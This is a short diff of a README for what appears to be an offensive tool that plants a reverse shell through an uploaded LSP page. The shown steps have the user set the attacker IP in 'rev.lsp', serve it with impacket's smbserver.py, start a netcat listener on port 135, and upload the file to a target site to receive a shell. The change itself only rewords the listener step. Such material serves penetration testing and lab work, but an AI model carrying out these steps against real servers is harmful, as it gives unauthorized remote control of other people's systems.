@@ -11,5 +11,5 @@ Be sure to install impacket, if it isn't already installed, since you'll need sm
 * ```cd lsp-reverse-shell```
 * Change the IP address in 'rev.lsp' to your machine.
 * ``` sudo smbserver.py SMB . -comment share -ts -debug -smb2support -username user -password 'pass' ```
-* ```sudo nc -nlvp 135```
+* Start a listener in another window with ```sudo nc -nlvp 135```
 * Upload the 'rev.lsp' file, open the page, and you should immediately catch a shell.
